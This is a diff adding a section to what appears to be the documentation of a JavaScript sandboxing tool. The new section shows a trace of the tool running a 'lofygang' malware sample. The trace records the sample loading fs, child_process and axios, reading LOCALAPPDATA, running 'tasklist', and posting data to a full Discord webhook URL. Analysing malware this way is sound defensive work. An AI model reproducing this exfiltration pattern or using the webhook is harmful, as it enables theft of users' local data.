@@ -132,3 +132,45 @@ Run real EVAL? [y/N]
 returning console.log instead of eval
 example_payload
 ```
+
+Actual lofygang payload
+```
+## Running "lofy1.js" ##
+Run real EVAL? [y/N]y
+Access real global.RegExp? [a=always/y/N]a
+Run real EVAL? [y/N]y
+Run real EVAL? [y/N]y
+Run real EVAL? [y/N]y
+Access real global.parseInt? [a=always/y/N]a
+Access real global.require? [a=always/y/N]N
+Get global.require as [p/n/l/f/0]f
+=>global.require( [Arguments] { '0': 'fs' } )
+Access real global.require? [a=always/y/N]N
+Get global.require as [p/n/l/f/0]f
+=>global.require( [Arguments] { '0': 'https' } )
+Access real global.require? [a=always/y/N]N
+Get global.require as [p/n/l/f/0]f
+=>global.require( [Arguments] { '0': 'glob' } )
+Access real global.require? [a=always/y/N]N
+Get global.require as [p/n/l/f/0]f
+=>global.require( [Arguments] { '0': 'child_process' } )
+Get global.require=>{}.exec as [p/n/l/f/0]f
+Access real global.require? [a=always/y/N]N
+Get global.require as [p/n/l/f/0]f
+=>global.require( [Arguments] { '0': 'axios' } )
+Access real global.process? [a=always/y/N]N
+Get global.process as [p/n/l/f/0]p
+Get global.process.env as [p/n/l/f/0]p
+Get global.process.env.LOCALAPPDATA as [p/n/l/f/0]0
+Get global.require=>{}.readdirSync as [p/n/l/f/0]f
+=>global.require=>{}.readdirSync( [Arguments] { '0': undefined } )
+Get global.require=>{}.readdirSync=>{}.forEach as [p/n/l/f/0]f
+=>global.require=>{}.readdirSync=>{}.forEach( [Arguments] { '0': {} } )
+=>global.require=>{}.exec( [Arguments] { '0': 'tasklist', '1': {} } )
+Get global.require=>{}.post as [p/n/l/f/0]f
+=>global.require=>{}.post( [Arguments] {
+  '0': 'https://discord.com/api/webhooks/1007006820629483640/PcVef3zPDULoGoHQBQu1WK_pLYOMtOdk6ynz0wqSFJf6yv0Ro5iZpMLiZ3Pe4aVKxk-j',
+  '1': { embeds: [ [Object] ] }
+} )
+
+```
